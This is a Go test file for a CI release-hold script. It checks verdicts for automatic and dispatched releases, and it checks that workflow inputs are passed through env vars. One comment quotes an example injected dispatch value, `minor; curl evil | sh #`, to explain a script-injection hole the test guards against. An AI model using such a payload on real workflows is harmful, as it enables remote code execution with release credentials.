package ciguard

import (
	"os/exec"
	"strings"
	"testing"
)

// The major hold's verdict, run the way version.yml runs it: the shipped
// script over the facts the step gathers from the tree release-it is about to
// release.
//
// Why it is worth a harness (#3550): this verdict is the only thing standing
// between one merged `feat!:` commit and an automatic v8 — release-it cuts a
// major from a single `!` commit, and an explicit dispatch increment
// overrides the recommended bump, so the auto-cut and the shipped-under-7.x
// minor are both one green-looking run away. The verdict lived nowhere before
// this; as inline workflow bash nothing in the tree could redden on it.
const majorHoldScript = "../../scripts/ci/release-major-hold.sh"

// majorHoldVerdict runs the shipped script with the given facts and returns
// the verdict, the log it wrote to stderr and its exit code.
func majorHoldVerdict(t *testing.T, facts map[string]string) (verdict, log string, code int) {
	t.Helper()
	cmd := exec.Command("bash", scriptUnderTest(t, majorHoldScript))
	cmd.Env = scriptEnv(t)
	for k, v := range facts {
		cmd.Env = append(cmd.Env, k+"="+v)
	}
	var stdout, stderr strings.Builder
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		exit, ok := err.(*exec.ExitError)
		if !ok {
			t.Fatalf("run %s: %v\nstderr: %s", majorHoldScript, err, stderr.String())
		}
		code = exit.ExitCode()
	}
	for _, line := range strings.Split(stdout.String(), "\n") {
		switch {
		case strings.HasPrefix(line, "verdict="):
			verdict = strings.TrimPrefix(line, "verdict=")
		case strings.TrimSpace(line) != "":
			t.Errorf("the script wrote %q to stdout — the one verdict line is all the caller appends to $GITHUB_OUTPUT, a second line becomes a step output nobody reads", line)
		}
	}
	return verdict, stderr.String(), code
}

// TestTheMajorHoldCutsAMajorOnlyOnItsExactVersion holds each rule of the
// verdict to a probe, in both directions: a major cut while the hold stood
// down ships breaking changes nobody gated, and a hold that refuses an
// ordinary patch freezes every release of main.
//
// Mutations seen red, each on its own case (one line of
// scripts/ci/release-major-hold.sh per mutation):
//
//   - the held-dispatch branch answering verdict=release instead of refusing:
//     "a dispatched minor while a major is pending" releases;
//   - `-gt` widened to `-ge`: "a dispatched minor with nothing pending"
//     (recommended 7.34.0, current 7.33.0) is refused;
//   - the numeric compare turned into a string compare: "a dispatched minor
//     under a pending 10.0.0 on 9.4.0" releases;
//   - the exact-version door removed (`input` never matching N+1.0.0):
//     "the exact 8.0.0 dispatch" is refused;
//   - the skip verdict folded into release: "an automatic release
//     over a pending major" releases instead of skipping with its notice.
func TestTheMajorHoldCutsAMajorOnlyOnItsExactVersion(t *testing.T) {
	const pending = "8.0.0" // the recommended bump over 7.33.0: a major
	for _, tc := range []struct {
		name        string
		facts       map[string]string
		wantVerdict string
		wantCode    int
		wantLog     string // substring of the stderr log; "" means nothing asserted
	}{
		// Automatic runs release everything below the next major, and skip
		// green with a notice on a pending major.
		{
			name: "an automatic release with a minor recommended releases",
			facts: map[string]string{
				"EVENT": "workflow_run", "REF": "main", "INPUT": "",
				"CURRENT": "7.33.0", "RECOMMENDED": "7.34.0",
			},
			wantVerdict: "release",
		},
		{
			name: "an automatic release over a chore-only range releases",
			facts: map[string]string{
				"EVENT": "workflow_run", "REF": "main", "INPUT": "",
				"CURRENT": "7.33.0", "RECOMMENDED": "",
			},
			wantVerdict: "release",
		},
		{
			name: "an automatic release with a patch recommended releases",
			facts: map[string]string{
				"EVENT": "workflow_run", "REF": "main", "INPUT": "",
				"CURRENT": "7.33.0", "RECOMMENDED": "7.33.1",
			},
			wantVerdict: "release",
		},
		{
			name: "an automatic release over a pending major skips green with a notice",
			facts: map[string]string{
				"EVENT": "workflow_run", "REF": "main", "INPUT": "",
				"CURRENT": "7.33.0", "RECOMMENDED": pending,
			},
			wantVerdict: "skip",
			wantLog:     "::notice::Release held",
		},
		{
			name: "the notice names the held version and the dispatch that cuts it",
			facts: map[string]string{
				"EVENT": "workflow_run", "REF": "main", "INPUT": "",
				"CURRENT": "7.33.0", "RECOMMENDED": pending,
			},
			wantVerdict: "skip",
			wantLog:     "8.0.0",
		},
		{
			name: "a pending major above ten is still held — the compare is numeric",
			facts: map[string]string{
				"EVENT": "workflow_run", "REF": "main", "INPUT": "",
				"CURRENT": "9.4.0", "RECOMMENDED": "10.0.0",
			},
			wantVerdict: "skip",
		},
		// Dispatches: everything below the next major passes with nothing
		// pending, and only the exact N+1.0.0 cuts a major.
		{
			name: "a dispatched minor with nothing pending releases",
			facts: map[string]string{
				"EVENT": "workflow_dispatch", "REF": "main", "INPUT": "minor",
				"CURRENT": "7.33.0", "RECOMMENDED": "7.34.0",
			},
			wantVerdict: "release",
		},
		{
			name: "a blank dispatch with nothing pending releases",
			facts: map[string]string{
				"EVENT": "workflow_dispatch", "REF": "main", "INPUT": "",
				"CURRENT": "7.33.0", "RECOMMENDED": "",
			},
			wantVerdict: "release",
		},
		{
			name: "an explicit same-major dispatch with nothing pending releases",
			facts: map[string]string{
				"EVENT": "workflow_dispatch", "REF": "main", "INPUT": "7.33.1",
				"CURRENT": "7.33.0", "RECOMMENDED": "",
			},
			wantVerdict: "release",
		},
		{
			name: "the exact next major dispatch cuts, pending or not",
			facts: map[string]string{
				"EVENT": "workflow_dispatch", "REF": "main", "INPUT": pending,
				"CURRENT": "7.33.0", "RECOMMENDED": pending,
			},
			wantVerdict: "release",
		},
		{
			name: "the exact next major dispatch cuts from a quiet tree too",
			facts: map[string]string{
				"EVENT": "workflow_dispatch", "REF": "main", "INPUT": pending,
				"CURRENT": "7.33.0", "RECOMMENDED": "",
			},
			wantVerdict: "release",
		},
		// Dispatches of a major that is not its exact version are refused,
		// pending or not.
		{
			name: "the word 'major' is refused",
			facts: map[string]string{
				"EVENT": "workflow_dispatch", "REF": "main", "INPUT": "major",
				"CURRENT": "7.33.0", "RECOMMENDED": "",
			},
			wantCode: 1,
			wantLog:  "a major is cut by dispatching exactly 8.0.0",
		},
		{
			name: "a skipped major (8.0.0 on 7.x) is refused",
			facts: map[string]string{
				"EVENT": "workflow_dispatch", "REF": "main", "INPUT": "9.0.0",
				"CURRENT": "7.33.0", "RECOMMENDED": "",
			},
			wantCode: 1,
			wantLog:  "a major is cut by dispatching exactly 8.0.0",
		},
		{
			name: "N+1.x.y is refused — only the exact 8.0.0 cuts",
			facts: map[string]string{
				"EVENT": "workflow_dispatch", "REF": "main", "INPUT": "8.1.0",
				"CURRENT": "7.33.0", "RECOMMENDED": "",
			},
			wantCode: 1,
			wantLog:  "a major is cut by dispatching exactly 8.0.0",
		},
		{
			name: "a prerelease of the next major is refused",
			facts: map[string]string{
				"EVENT": "workflow_dispatch", "REF": "main", "INPUT": "8.0.0-rc.1",
				"CURRENT": "7.33.0", "RECOMMENDED": "",
			},
			wantCode: 1,
			wantLog:  "a major is cut by dispatching exactly 8.0.0",
		},
		{
			name: "a major claim above ten is refused — the compare is numeric",
			facts: map[string]string{
				"EVENT": "workflow_dispatch", "REF": "main", "INPUT": "minor",
				"CURRENT": "9.4.0", "RECOMMENDED": "10.0.0",
			},
			wantCode: 1,
			wantLog:  "ship its breaking changes under v9",
		},
		// While a major is pending, every other dispatch from main is refused.
		{
			name: "a dispatched minor while a major is pending is refused",
			facts: map[string]string{
				"EVENT": "workflow_dispatch", "REF": "main", "INPUT": "minor",
				"CURRENT": "7.33.0", "RECOMMENDED": pending,
			},
			wantCode: 1,
			wantLog:  "main is held for v8: a patch or minor cut from main would ship its breaking changes under v7",
		},
		{
			name: "a dispatched patch while a major is pending is refused",
			facts: map[string]string{
				"EVENT": "workflow_dispatch", "REF": "main", "INPUT": "patch",
				"CURRENT": "7.33.0", "RECOMMENDED": pending,
			},
			wantCode: 1,
			wantLog:  "Dispatch version 8.0.0 to cut the major, or release the fix from release/v7",
		},
		{
			name: "an explicit same-major dispatch while a major is pending is refused",
			facts: map[string]string{
				"EVENT": "workflow_dispatch", "REF": "main", "INPUT": "7.33.1",
				"CURRENT": "7.33.0", "RECOMMENDED": pending,
			},
			wantCode: 1,
			wantLog:  "main is held for v8",
		},
		{
			name: "a blank dispatch while a major is pending is refused",
			facts: map[string]string{
				"EVENT": "workflow_dispatch", "REF": "main", "INPUT": "",
				"CURRENT": "7.33.0", "RECOMMENDED": pending,
			},
			wantCode: 1,
			wantLog:  "received ''",
		},
		// The hold guards main alone: any other ref releases as it always did.
		{
			name: "a dispatch on a release branch is not held",
			facts: map[string]string{
				"EVENT": "workflow_dispatch", "REF": "release/v7", "INPUT": "minor",
				"CURRENT": "7.33.0", "RECOMMENDED": pending,
			},
			wantVerdict: "release",
			wantLog:     "the release hold guards main alone",
		},
		{
			name: "an automatic run on another ref is not held either",
			facts: map[string]string{
				"EVENT": "workflow_run", "REF": "release/v7", "INPUT": "",
				"CURRENT": "7.33.0", "RECOMMENDED": pending,
			},
			wantVerdict: "release",
		},
		// Facts that cannot support a verdict are refused, not guessed.
		{
			name:        "an unknown event is refused",
			facts:       map[string]string{"EVENT": "push", "REF": "main", "CURRENT": "7.33.0"},
			wantCode:    2,
			wantLog:     "release-major-hold: EVENT is 'push'",
			wantVerdict: "",
		},
		{
			name:        "a missing ref is refused",
			facts:       map[string]string{"EVENT": "workflow_dispatch", "REF": "", "CURRENT": "7.33.0"},
			wantCode:    2,
			wantLog:     "REF is empty",
			wantVerdict: "",
		},
		{
			name:        "a CURRENT that is not a bare X.Y.Z is refused",
			facts:       map[string]string{"EVENT": "workflow_run", "REF": "main", "CURRENT": "v7.33.0"},
			wantCode:    2,
			wantLog:     "CURRENT is 'v7.33.0'",
			wantVerdict: "",
		},
		{
			name: "a RECOMMENDED that is not a bare X.Y.Z is refused",
			facts: map[string]string{
				"EVENT": "workflow_run", "REF": "main", "INPUT": "",
				"CURRENT": "7.33.0", "RECOMMENDED": "8.0.0-rc.1",
			},
			wantCode:    2,
			wantLog:     "RECOMMENDED is '8.0.0-rc.1'",
			wantVerdict: "",
		},
		{
			name: "an automatic event carrying a version input is refused",
			facts: map[string]string{
				"EVENT": "workflow_run", "REF": "main", "INPUT": "minor",
				"CURRENT": "7.33.0", "RECOMMENDED": "",
			},
			wantCode:    2,
			wantLog:     "carries no version input",
			wantVerdict: "",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			verdict, log, code := majorHoldVerdict(t, tc.facts)
			if code != tc.wantCode {
				t.Fatalf("exit %d, want %d (verdict %q)\nlog: %s", code, tc.wantCode, verdict, log)
			}
			if verdict != tc.wantVerdict {
				t.Errorf("verdict %q, want %q\nlog: %s", verdict, tc.wantVerdict, log)
			}
			if tc.wantLog != "" && !strings.Contains(log, tc.wantLog) {
				t.Errorf("the log does not carry %q — the operator reads this line to act\nlog: %s", tc.wantLog, log)
			}
			if tc.wantCode == 1 && !strings.Contains(log, "::error::") {
				t.Errorf("a refusal without an ::error:: annotation reads as a crashed step, not a decision\nlog: %s", log)
			}
			if tc.wantCode == 2 && !strings.Contains(log, "release-major-hold:") {
				t.Errorf("the refusal does not name itself on stderr: %q", log)
			}
		})
	}
}

// TestTheReleaseAsksTheMajorHoldBeforeReleaseIt pins the pair: the workflow
// gathers the facts through env vars (never inline interpolation — a dispatch
// value like `minor; curl evil | sh #` in `run:` is a script-injection hole
// in a job holding the App token + id-token: write), runs the shipped script,
// and release-it reads the verdict out of its output. A harness over a script
// the workflow does not run proves nothing, and a fact gathered anywhere else
// than the tree release-it releases judges a different tree.
func TestTheReleaseAsksTheMajorHoldBeforeReleaseIt(t *testing.T) {
	job, ok := readReleaseWorkflow(t).Jobs["version"]
	if !ok {
		t.Fatalf("%s has no `version` job", releaseWorkflowPath)
	}
	const (
		majorID    = "major"
		releaseRun = "Run release-it"
	)
	majorAt, releaseAt := -1, -1
	var major struct {
		If  string            `yaml:"if"`
		Env map[string]string `yaml:"env"`
		Run string            `yaml:"run"`
	}
	var releaseIf string
	for i, st := range job.Steps {
		switch {
		case st.ID == majorID:
			majorAt, major.If, major.Env, major.Run = i, st.If, st.Env, st.Run
		case st.Name == releaseRun:
			releaseAt, releaseIf = i, st.If
		}
	}
	if majorAt < 0 {
		t.Fatalf("the version job has no step id %q — the major hold these guards read is gone", majorID)
	}
	if releaseAt < 0 {
		t.Fatalf("the version job has no %q step", releaseRun)
	}
	if majorAt >= releaseAt {
		t.Errorf("the major hold runs at step %d and release-it at step %d — the hold must judge the tree before release-it runs on it", majorAt, releaseAt)
	}
	if !strings.Contains(releaseIf, "steps.major.outputs.verdict == 'release'") {
		t.Errorf("release-it's condition does not read the major hold's verdict — a hold nobody listens to skips releases for nothing or cuts the one it refused")
	}
	if !strings.Contains(major.Run, "scripts/ci/release-major-hold.sh") {
		t.Errorf("the major hold step does not run %s — the verdict would be inline again, and this harness would exercise a file nothing calls", majorHoldScript)
	}
	if !strings.Contains(major.Run, `>> "$GITHUB_OUTPUT"`) {
		t.Errorf("the major hold step does not append the script's stdout to $GITHUB_OUTPUT — release-it reads steps.major.outputs.verdict, an output nothing writes is always empty")
	}
	if !strings.Contains(major.Run, "release-it --release-version --ci") {
		t.Errorf("the major hold step does not ask release-it for the recommended version (`release-it --release-version --ci`) — the hold would judge a pending major no one computed")
	}
	for envVar, expression := range map[string]string{
		"EVENT": "${{ github.event_name }}",
		"INPUT": "${{ github.event.inputs.version }}",
	} {
		if major.Env[envVar] != expression {
			t.Errorf("the major hold step receives %s as %q, want %q — the fact must come from the event through env", envVar, major.Env[envVar], expression)
		}
	}
	if strings.Contains(major.Run, "${{") {
		t.Errorf("the major hold step's run embeds a GitHub expression — interpolating an event value into `run:` is the script-injection hole the release-it step's env comment describes; pass it through env")
	}
}
